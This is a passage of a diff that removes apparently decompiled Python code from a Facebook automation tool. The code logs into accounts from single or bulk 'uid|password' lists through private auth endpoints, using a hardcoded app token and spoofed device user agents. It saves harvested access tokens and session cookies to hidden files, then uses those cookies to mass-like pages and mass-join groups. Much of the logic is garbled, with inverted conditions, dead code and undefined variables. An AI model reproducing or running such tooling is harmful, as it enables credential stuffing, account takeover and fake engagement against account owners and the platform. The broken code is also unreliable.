-    print(f'''{yellow}  [2] {blue}VIEW YOUR LIST OF RPA''')
-    print(f'''{yellow}  [3] {blue}VIEW YOUR LIST OF FRA PAGES''')
-    print(f'''{yellow}  [4] {blue}VIEW YOUR LIST OF RPA PAGES''')
-    print(f'''{red}  [0] {red}RETURN TO MAIN MENU''')
-    line()
-    file_choose = input(f'''{yellow}  Choose : {green}''')
-    line()
-    if file_choose == '1' or file_choose == '01':
-        file_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT-NAME-ID.txt'
-        display_file_content(file_path)
-        return None
-    if None == '2' or file_choose == '02':
-        file_path = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT-NAME-ID.txt'
-        display_file_content(file_path)
-        return None
-    if None == '3' or file_choose == '03':
-        file_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt'
-        display_file_content(file_path)
-        return None
-    if None == '4' or file_choose == '04':
-        file_path = '/sdcard/.EXTRACT-TOKEN-RP-PAGES-NAME-ID.txt'
-        display_file_content(file_path)
-        return None
-    if None == '0' or file_choose == '00':
-        main()
-        return None
-    print(f'''{red}  Invalid Input!''')
-    sleep(1.5)
-    display_file_info()
-
-
-def display_file_content(file_path):
-    file = open(file_path, 'r')
-    content = file.readlines()
-    total_lines = len(content)
-    print(f'''{yellow}  Total : {green}{total_lines}\n''')
-    for index, line in enumerate(content, start = 1):
-        print(f'''{yellow}  [{index}] {white}- {green}''' + line.strip())
-        print(None, None)
-        return None
-        if not None:
-            pass
-    return None
-    if FileNotFoundError:
-        print(f'''{red}  Please Stored first!''')
-        return None
-    if None:
-        e = None
-        print(f'''{red}  Please Stored first!''')
-        e = None
-        del e
-        return None
-    e = None
-    del e
-
-
-def delete_files():
-    clear()
-    logo()
-    print(f'''{white}  CHOOSE TO RESET:''')
-    print(f'''{yellow}  [1] {blue}RESET YOUR LIST OF FRA''')
-    print(f'''{yellow}  [2] {blue}RESET YOUR LIST OF RPA''')
-    print(f'''{yellow}  [3] {blue}RESET YOUR LIST OF FRA PAGES''')
-    print(f'''{yellow}  [4] {blue}RESET YOUR LIST OF RPA PAGES''')
-    print(f'''{red}  [0] {red}RETURN TO MAIN MENU''')
-    line()
-    account_choose = input(f'''{yellow}  Choose : {green}''')
-    line()
-    if account_choose == '1' or account_choose == '01':
-        file_paths = [
-            '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt',
-            '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT-NAME-ID.txt']
-        all_deleted = True
-        for file_path in file_paths:
-            if os.path.exists(file_path):
-                os.remove(file_path)
-            all_deleted = False
-            if all_deleted:
-                print(f'''{green}\n  Tool Successfully Reset!''')
-                return None
-            print(f'''{red}\n  Use the tool first!''')
-            return None
-            if account_choose == '2' or account_choose == '02':
-                file_paths = [
-                    '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt',
-                    '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT-NAME-ID.txt']
-                all_deleted = True
-                for file_path in file_paths:
-                    if os.path.exists(file_path):
-                        os.remove(file_path)
-                    all_deleted = False
-                    if all_deleted:
-                        print(f'''{green}\n  Tool Successfully Reset!''')
-                        return None
-                    print(f'''{red}\n  Use the tool first!''')
-                    return None
-                    if account_choose == '3' or account_choose == '03':
-                        file_paths = [
-                            '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt',
-                            '/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt']
-                        all_deleted = True
-                        for file_path in file_paths:
-                            if os.path.exists(file_path):
-                                os.remove(file_path)
-                            all_deleted = False
-                            if all_deleted:
-                                print(f'''{green}\n  Tool Successfully Reset!''')
-                                return None
-                            print(f'''{red}\n  Use the tool first!''')
-                            return None
-                            if account_choose == '4' or account_choose == '04':
-                                file_paths = [
-                                    '/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt',
-                                    '/sdcard/.EXTRACT-TOKEN-RP-PAGES-NAME-ID.txt']
-                                all_deleted = True
-                                for file_path in file_paths:
-                                    if os.path.exists(file_path):
-                                        os.remove(file_path)
-                                    all_deleted = False
-                                    if all_deleted:
-                                        print(f'''{green}\n  Tool Successfully Reset!''')
-                                        return None
-                                    print(f'''{red}\n  Use the tool first!''')
-                                    return None
-                                    if account_choose == '0' or account_choose == '00':
-                                        main()
-                                        return None
-                                    print(f'''{red}  Invalid Input!''')
-                                    sleep(1.5)
-                                    delete_files()
-                                    return None
-
-
-def extract_and_save_facebook_pages():
-    line()
-    print(f'''{white}  CHOOSE WHERE TO SAVE:''')
-    print(f'''{yellow}  [1] {blue}ON YOUR FRA LIST''')
-    print(f'''{yellow}  [2] {blue}ON YOUR RPA LIST''')
-    print(f'''{yellow}  [3] {blue}ON YOUR FRA PAGES LIST''')
-    print(f'''{yellow}  [4] {blue}ON YOUR RPA PAGES LIST''')
-    print(f'''{red}  [0] {red}RETURN''')
-    line()
-    account_choose = input(f'''{yellow}  Choose : {green}''')
-    line()
-    if account_choose == '1':
-        open('/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt', 'a').write('')
-        open('/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT-NAME-ID.txt', 'a').write('')
-        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT-NAME-ID.txt'
-        get_facebook_pages()
-        return None
-    if None == '2':
-        open('/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt', 'a').write('')
-        open('/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT-NAME-ID.txt', 'a').write('')
-        path_file = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT-NAME-ID.txt'
-        get_facebook_pages()
-        return None
-    if None == '3':
-        open('/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt', 'a').write('')
-        open('/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt', 'a').write('')
-        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt'
-        get_facebook_pages()
-        return None
-    if None == '4':
-        open('/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt', 'a').write('')
-        open('/sdcard/.EXTRACT-TOKEN-RP-PAGES-NAME-ID.txt', 'a').write('')
-        path_file = '/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-RP-PAGES-NAME-ID.txt'
-        get_facebook_pages()
-        return None
-    if None == '0':
-        start_tool()
-        return None
-    print('Invalid choice')
-
-
-
-
-
-def get_facebook_pages():
-    ses = requests.Session()
-    clear()
-    logo()
-    print(f'''{green}  METHOD 1 {white}---> {yellow}EXTRACT NORMAL ACCOUNT PAGES''')
-    line()
-    ids = input(f'''{yellow}  Enter Facebook ID: {green}''')
-    line()
-    pas = input(f'''{yellow}  Enter Facebook Password: {green}''')
-    line()
-    fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
-    fbbv = str(random.randint(111111111, 999999999))
-    fbrv = '0'
-    random_seed = random.Random()
-    adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
-    ua_bgraph = f'''[FBAN/FB4A;FBAV/{str(random.randint(49, 66))}.0.0.{str(random.randrange(20, 49))}{str(random.randint(11, 99))};FBBV/{str(random.randint(11111111, 77777777))};[FBAN/FB4A;FBAV/{fbav};FBPN/com.facebook.katana;FBLC/pt_BR;FBBV/{fbbv};FBCR/CLARO BR;FBMF/Xiaomi;FBBD/Redmi;FBDV/M1908C3JGG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{{density=2.75,width=1080,height=2216}};FB_FW/1;FBRV/470765339;] FBBK/1'''
-    data = {
-        'locale': 'en_SV',
-        'client_country_code': 'SV',
-        'fb_api_req_friendly_name': 'authenticate',
-        'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
-        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
-    head = {
-        'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
-    url = 'https://graph.facebook.com/auth/login'
-    po = requests.post(url, data = data, headers = head).json()
-    if 'session_key' in po:
-        poo = po.get('access_token', '')
-        token = str(poo)
-        cookie = po.get('session_cookies', [])()
-        return get_facebook_pages_with_token(token)
-    if Exception:
-        e = 'True'
-        print(f'''Error: {e}''')
-        e = None
-        del e
-        e = None
-        del e
-
-import requests
-import random
-import string
-import uuid
-
-def get_facebook_account():
-    clear()
-    logo()
-    print(f'''{green}  METHOD 2 {white}---> {yellow}EXTRACT SINGLE NORMAL ACCOUNT''')
-    line()
-    print(f'''{white}  CHOOSE WHERE TO SAVE:''')
-    print(f'''{yellow}  [1] {blue}ON YOUR FRA LIST''')
-    print(f'''{yellow}  [2] {blue}ON YOUR RPA LIST''')
-    print(f'''{yellow}  [3] {blue}ON YOUR FRA PAGES LIST''')
-    print(f'''{yellow}  [4] {blue}ON YOUR RPA PAGES LIST''')
-    print(f'''{red}  [0] {red}RETURN''')
-    line()
-    account_choose = input(f'''{yellow}  Choose : {green}''')
-    line()
-    if account_choose == '1':
-        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT-NAME-ID.txt'
-    if account_choose == '2':
-        path_file = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT-NAME-ID.txt'
-    if account_choose == '3':
-        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt'
-    if account_choose == '4':
-        path_file = '/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-RP-PAGES-NAME-ID.txt'
-    if account_choose == '0':
-        start_tool()
-        return None
-    print('Invalid choice')
-    return None
-    uid = input(f'''{yellow}  Enter Facebook ID: {green}''')
-    line()
-    pas = input(f'''{yellow}  Enter Facebook Password: {green}''')
-    line()
-    fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
-    fbbv = str(random.randint(111111111, 999999999))
-    fbrv = '0'
-    random_seed = random.Random()
-    adid = ''.join(random_seed.choices(string.hexdigits, k = 16))
-    ua_bgraph = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';' + '[FBAN/FB4A;FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=3.0,width=1080,height=2107};FBLC/fr_FR;FBRV/' + fbrv + ';FBCR/Ooredoo TN;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1M;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
-    data = {
-        'locale': 'en_SV',
-        'client_country_code': 'SV',
-        'fb_api_req_friendly_name': 'authenticate',
-        'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
-        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
-    head = {
-        'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
-    url = 'https://graph.facebook.com/auth/login'
-    po = requests.post(url, headers = head, data = data).json()
-    if 'session_key' in po:
-        cookie = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-        poo = po.get('access_token', '')
-        token = str(poo)
-        open('/sdcard/.EXTRACT-COOKIE-ACCOUNT-NAME-ID.txt', 'a').write('')
-        print(f'''  {white}ID : {yellow}{uid} {white}---> {green}Successfully Extract!''')
-        open(check_path, 'a').write(uid + '\n')
-        open(path_file, 'a').write('%s\n' % poo)
-    print(f'''  {red}ID : {red}{uid} {white}---> {red}Failed to Extract!''')
-    if Exception:
-        e = ';'.join
-        print(f'''{red}  An error occurred!''')
-        e = None
-        del e
-        e = None
-        del e
-
-ok = []
-checkpoint = []
-loop = 0
-import uuid
-import requests
-import random
-import sys
-from concurrent.futures import ThreadPoolExecutor as thread
-
-def bgraph_bulk_account():
-    clear()
-    logo()
-    print(f'''{green}  METHOD 3 {white}---> {yellow}EXTRACT BULK NORMAL ACCOUNTS M1''')
-    print(f'''{red}  File Format : {green}uid|password''')
-    line()
-    print(f'''{white}  CHOOSE WHERE TO SAVE:''')
-    print(f'''{yellow}  [1] {blue}ON YOUR FRA LIST''')
-    print(f'''{yellow}  [2] {blue}ON YOUR RPA LIST''')
-    print(f'''{yellow}  [3] {blue}ON YOUR FRA PAGES LIST''')
-    print(f'''{yellow}  [4] {blue}ON YOUR RPA PAGES LIST''')
-    print(f'''{red}  [0] {red}RETURN''')
-    line()
-    account_choose = input(f'''{yellow}  Choose : {green}''')
-    line()
-    if account_choose == '1':
-        open('/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt', 'a').write('')
-        open('/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT-NAME-ID.txt', 'a').write('')
-        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT-NAME-ID.txt'
-    if account_choose == '2':
-        open('/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt', 'a').write('')
-        open('/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT-NAME-ID.txt', 'a').write('')
-        path_file = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT-NAME-ID.txt'
-    if account_choose == '3':
-        open('/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt', 'a').write('')
-        open('/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt', 'a').write('')
-        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt'
-    if account_choose == '4':
-        open('/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt', 'a').write('')
-        open('/sdcard/.EXTRACT-TOKEN-RP-PAGES-NAME-ID.txt', 'a').write('')
-        path_file = '/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-RP-PAGES-NAME-ID.txt'
-    if account_choose == '0':
-        start_tool()
-        return None
-    print('Invalid choice')
-    return None
-    filee = input(f'''{yellow}  Input File Path : {green}''')
-    line()
-    fo = open(filee, 'r').read().splitlines()
-    if FileNotFoundError:
-        print(f'''{red}  File Not Found''')
-        slp(5)
-        main()
-    cook = thread(max_workers = 30)
-    for i in fo:
-        (uid, pw) = i.split('|')
-        cook.submit(graph, uid, pw, path_file, check_path)
-        print(None, None)
-        return None
-        if not None:
-            pass
-
-
-def graph(uid, pw, path_file, check_path):
-    global loop
-    accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-    data = {
-        'method': 'auth.login',
-        'fb_api_req_friendly_name': 'authenticate',
-        'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-        'api_key': '62f8ce9f74b12f84c123cc23437a4a32' }
-    simm3 = random.choice([
-        'GLOBE',
-        'SMART'])
-    headers = '62f8ce9f74b12f84c123cc23437a4a32'
-    url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
-    po = requests.post(url, headers = headers, data = data).json()
-    if 'session_key' in po:
-        cookie = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-        poo = po.get('access_token', '')
-        token = str(poo)
-        open('/sdcard/.EXTRACT-COOKIE-ACCOUNT-NAME-ID.txt', 'a').write('')
-        if uid in open(check_path, 'r').read():
-            print(f'''{red}  Account Already Exist in Tool {yellow}---> {red}{uid}''')
-            line()
-        print(f'''  {white}ID : {yellow}{uid} {white}---> {green}Successfully Extract!''')
-        line()
-        open(check_path, 'a').write(uid + '\n')
-        open(path_file, 'a').write('%s\n' % poo)
-        ok.append(uid)
-    if Exception:
-        e = ';'.join
-        print(f'''{red}  An error occurred!''')
-        e = None
-        del e
-        e = None
-        del e
-    loop += 1
-
-
-
-
-
-def bgraph_bulk_pages():
-    clear()
-    logo()
-    print(f'''{green}  METHOD 5 {white}---> {yellow}EXTRACT BULK ACCOUNTS PAGES''')
-    print(f'''{red}  File Format : {green}uid|password''')
-    line()
-    print(f'''{white}  CHOOSE WHERE TO SAVE:''')
-    print(f'''{yellow}  [1] {blue}ON YOUR FRA LIST''')
-    print(f'''{yellow}  [2] {blue}ON YOUR RPA LIST''')
-    print(f'''{yellow}  [3] {blue}ON YOUR FRA PAGES LIST''')
-    print(f'''{yellow}  [4] {blue}ON YOUR RPA PAGES LIST''')
-    print(f'''{red}  [0] {red}RETURN''')
-    line()
-    account_choose = input(f'''{yellow}  Choose : {green}''')
-    line()
-    if account_choose == '1':
-        open('/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt', 'a').write('')
-        open('/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT-NAME-ID.txt', 'a').write('')
-        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT-NAME-ID.txt'
-    if account_choose == '2':
-        open('/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt', 'a').write('')
-        open('/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT-NAME-ID.txt', 'a').write('')
-        path_file = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT-NAME-ID.txt'
-    if account_choose == '3':
-        open('/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt', 'a').write('')
-        open('/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt', 'a').write('')
-        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt'
-    if account_choose == '4':
-        open('/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt', 'a').write('')
-        open('/sdcard/.EXTRACT-TOKEN-RP-PAGES-NAME-ID.txt', 'a').write('')
-        path_file = '/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-RP-PAGES-NAME-ID.txt'
-    if account_choose == '0':
-        start_tool()
-        return None
-    print('Invalid choice')
-    return None
-    line
-    filee = input(f'''{yellow}  Input File Path : {green}''')
-    line()
-    fo = open(filee, 'r').read().splitlines()
-    if FileNotFoundError:
-        print(f'''{red}  File Not Found''')
-        slp(5)
-        main()
-    cook = thread(max_workers = 30)
-    for i in fo:
-        (uid, pw) = i.split('|')
-        cook.submit(graph2, uid, pw, path_file, check_path)
-        print(None, None)
-        return None
-        if not None:
-            pass
-
-
-def graph4(uid, pw, path_file, check_path):
-    fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
-    fbbv = str(random.randint(111111111, 999999999))
-    fbrv = '0'
-    random_seed = random.Random()
-    adid = ''.join(random_seed.choices(string.hexdigits, k = 16))
-    ua_bgraph = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';' + '[FBAN/FB4A;FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=3.0,width=1080,height=2107};FBLC/fr_FR;FBRV/' + fbrv + ';FBCR/Ooredoo TN;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1M;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
-    data = {
-        'locale': 'en_SV',
-        'client_country_code': 'SV',
-        'fb_api_req_friendly_name': 'authenticate',
-        'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
-        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
-    head = {
-        'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
-    url = 'https://graph.facebook.com/auth/login'
-    po = requests.post(url, headers = head, data = data).json()
-    if 'session_key' in po:
-        cookie = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-        poo = po.get('access_token', '')
-        token = str(poo)
-        return get_facebook_pages_with_token3(uid, token, path_file, check_path)
-    if Exception:
-        e = 'True'
-        print(f'''{red}  An error occurred!''')
-        e = None
-        del e
-        e = None
-        del e
-
-
-def graph2(uid, pw, path_file, check_path):
-    global loop
-    accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-    pas = pw
-    data = {
-        'method': 'auth.login',
-        'fb_api_req_friendly_name': 'authenticate',
-        'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-        'api_key': '62f8ce9f74b12f84c123cc23437a4a32' }
-    simm3 = random.choice([
-        'GLOBE',
-        'SMART'])
-    headers = '62f8ce9f74b12f84c123cc23437a4a32'
-    url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
-    po = requests.post(url, headers = headers, data = data).json()
-    if 'session_key' in po:
-        cookie = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-        poo = po.get('access_token', '')
-        token = str(poo)
-        return get_facebook_pages_with_token3(uid, token, path_file, check_path)
-    if Exception:
-        e = 'x-fb-connection-token'
-        print(f'''An error occurred: {e}''')
-        e = None
-        del e
-        e = None
-        del e
-    loop += 1
-
-ids = []
-OK = []
-CP = []
-loop = 0
-
-def get_ua():
-    return f'''Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S{random.randrange(100, 9999)}/{random.randrange(100, 9999)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.randrange(1, 9)}; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/{random.randrange(1, 9)}.{random.randrange(1, 9)} Mobile WVGA SMM-MMS/1.2.0 OPN-B'''
-
-
-def datr():
-    global loop
-    ids.clear()
-    OK.clear()
-    CP.clear()
-    loop = loop * 0
-    clear()
-    logo()
-    print(f'''{green}  METHOD 4 {white}---> {yellow}EXTRACT BULK NORMAL ACCOUNTS M2''')
-    line()
-    file_name = input(f'''{yellow}  Put file path : {green}''')
-    line()
-    ids.extend(open(file_name, 'r').read().splitlines())
-    if Exception:
-        e = None
-        print(f''' {str(e)}''')
-        sleep(0.8)
-        main()
-        e = None
-        del e
-        e = None
-        del e
-    checker = thread(max_workers = 30)
-    for id in ids:
-        checker.submit(_Cookies, id)
-        print(None, None)
-        if not None:
-            pass
-    exit()
-
-
-def getCookies(uid, password):
-    session = requests.Session()
-    _ua = get_ua()
-    _fb = session.get('https://m.facebook.com').text
-    _data = {
-        'lsd': re.search('name="lsd" value="(.*?)"', str(_fb)).group(1),
-        'jazoest': re.search('name="jazoest" value="(.*?)"', str(_fb)).group(1),
-        'm_ts': re.search('name="m_ts" value="(.*?)"', str(_fb)).group(1),
-        'li': re.search('name="li" value="(.*?)"', str(_fb)).group(1),
-        'try_number': '0',
-        'unrecognized_tries': '0',
-        'email': uid,
-        'pass': password,
-        'login': 'Log In' }
-    _header = {
-        'authority': 'm.facebook.com',
-        'upgrade-insecure-requests': '1',
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-        'accept-language': 'en-PK,en-GB,en-US;q=0.9,en;q=0.8,en;q=0.7',
-        'dnt': '1',
-        'x-requested-with': 'mark.via.gp',
-        'sec-fetch-site': 'none',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-user': '?1',
-        'sec-fetch-dest': 'document',
-        'accept-encoding': 'gzip, deflate, br',
-        'accept-language': 'en-US,en;q=0.9',
-        'cache-control': 'max-age=0',
-        'user-agent': _ua }
-    _res = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data = _data, headers = _header).text
-    cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-    return cookies
-
-
-def _Cookies(id):
-    global loop
-    (uid, psw) = id.split('|')
-    _cookies = getCookies(uid, psw)
-    if 'c_user' in _cookies:
-        print(f'''  {white}ID : {yellow}{uid} {white}---> {green}Successfully Extract!''')
-        line()
-        open('/sdcard/.EXTRACT-COOKIE-ACCOUNT.txt', 'a').write(_cookies + '\n')
-    if 'checkpoint' in _cookies:
-        print(f'''  {red}ID : {red}{uid} {white}---> {red}Failed!''')
-        line()
-    loop += 1
-    return None
-
-
-def p_like():
-    clear()
-    logo()
-    ses = requests.Session()
-    cokix = input(f'''{yellow}  Cookie : {green}''')
-    line()
-    ids_coki = input(f'''{yellow}  Input File Path :{green} ''')
-    page_id = open(ids_coki).read().splitlines()
-    print('  File Not found')
-    sleep(3)
-    line()
-    page_ids = input(f'''{yellow}  Input Target Page ID : {green}''')
-    line()
-    limitx = int(input(f'''{yellow}  Quantity : {green}'''))
-    headersccc['user-agent'] = W_ueragnt()
-    mbasic_url = 'https://mbasic.facebook.com/' + page_ids
-    reqx = bs(ses.get(mbasic_url, headers = headersccc, cookies = {
-        'cookie': cokix }).content, 'html.parser')
-    reqxx = reqx.find_all('a', string = 'Message')
-    d_pa_id = str(reqxx).split('href="/messages/thread/')[1].split('/')[0]
-    clear()
-    logo()
-    print(f'''{yellow}  Total Page : {green}{len(page_id)}''')
-    print(f'''{yellow}  Target     : {green}{page_ids}''')
-    line()
-    for i in range(min(len(page_id), limitx)):
-        pageid = page_id[i]
-        page_uidz = 'i_user=' + pageid
-        cookies_page = {
-            'cookie': cokix + page_uidz }
-        mylove = ThreadPoolExecutor(max_workers = 30)
-        mylove.submit(likepage, cookies_page, pageid, page_ids, d_pa_id)
-        print(None, None)
-        if not None:
-            pass
-        line()
-        line()
-        print('{red}  FAILED')
-        print(cokix)
-        print(linex())
-        open('failed.txt', 'a', encoding = 'utf8').write(f'''{cokix}\n''')
-        exit()
-        return None
-
-
-def likepage(cookies_page, pageid, page_ids, d_pa_id):
-    headers['user-agent'] = W_ueragnt()
-    web_url = 'https://www.facebook.com/profile.php?id=' + page_ids
-    req = bs(ses.get(web_url, headers = headers, cookies = cookies_page).content, 'html.parser')
-    uidx = re.search('__user=(.*?)&', str(req)).group(1)
-    data_post = {
-        'av': uidx,
-        'dpr': re.search('"pr":(.*?),', str(req)).group(1),
-        'fb_dtsg': re.search('"DTSGInitialData",\\[\\],{"token":"(.*?)"}', str(req)).group(1),
-        'jazoest': re.search('&jazoest=(.*?)"', str(req)).group(1),
-        'lsd': re.search('"LSD",\\[\\],{"token":"(.*?)"}', str(req)).group(1),
-        'fb_api_caller_class': 'RelayModern',
-        'fb_api_req_friendly_name': 'CometProfilePlusLikeMutation',
-        'variables': f'''{{"input":{{"is_tracking_encrypted":false,"page_id":{d_pa_id!s},"source":null,"tracking":null,"actor_id":{uidx!s},"client_mutation_id":"1"}},"scale":1}}''',
-        'server_timestamps': 'true',
-        'doc_id': '6716077648448761' }
-    headers['user-agent'] = W_ueragnt()
-    response = ses.post('https://www.facebook.com/api/graphql/', cookies = cookies_page, headers = headers, data = data_post)
-    if response.status_code == 200:
-        data = response.json()
-        subscribe_status = data['data']['page_like']['page']['subscribe_status']
-        done.append(pageid)
-        print(f'''{white}  [{len(done)}] {green}Page Like and Follow Done :{white} {pageid} ''')
-        return None
-    return None
-    print(f'''{red}  Failed!''')
-
-done = []
-
-def g_join():
-    clear()
-    logo()
-    cokix = input(f'''{yellow}  Cookie : {green}''')
-    line()
-    ids_coki = input(f'''{yellow}  Input File Path : {green} ''')
-    page_id = open(ids_coki).read().splitlines()
-    print('  File not found')
-    sleep(3)
-    line()
-    group_ids = input(f'''{yellow}  Input Group ID : {green}''')
-    line()
-    limitx = int(input(f'''{yellow}  Quantity : {green}'''))
-    clear()
-    logo()
-    print(f'''{yellow}  Total Page : {green}{len(page_id)}''')
-    print(f'''{green}  Target     : {green}{group_ids}''')
-    line()
-    for i in range(min(len(page_id), limitx)):
-        pageid = page_id[i]
-        page_uidz = 'i_user=' + pageid
-        cookies_page = {
-            'cookie': cokix + page_uidz }
-        mylove = ThreadPoolExecutor(max_workers = 30)
-        mylove.submit(g_joining, cookies_page, pageid, group_ids)
-        print(None, None)
-        if not None:
-            pass
-        line()
-        line()
-        print('{red}  FAILED')
-        exit()
-        return None
-
-
-def g_joining(cookies_page, pageid, group_ids):
-    secx = requests.Session()
-    use_link = f'''https://www.facebook.com/groups/{group_ids}'''
-    headers['user-agent'] = W_ueragnt()
-    req = bs(secx.get(use_link, headers = headers, cookies = cookies_page).content, 'html.parser')
-    av = re.search('__user=(.*?)&', str(req)).group(1)
-    data = {
-        'av': av,
-        'dpr': re.search('"pr":(.*?),', str(req)).group(1),
-        'fb_dtsg': re.search('"DTSGInitialData",\\[\\],{"token":"(.*?)"}', str(req)).group(1),
-        'jazoest': re.search('&jazoest=(.*?)"', str(req)).group(1),
-        'lsd': re.search('"LSD",\\[\\],{"token":"(.*?)"}', str(req)).group(1),
-        'qpl_active_flow_ids': '431626709',
-        'fb_api_caller_class': 'RelayModern',
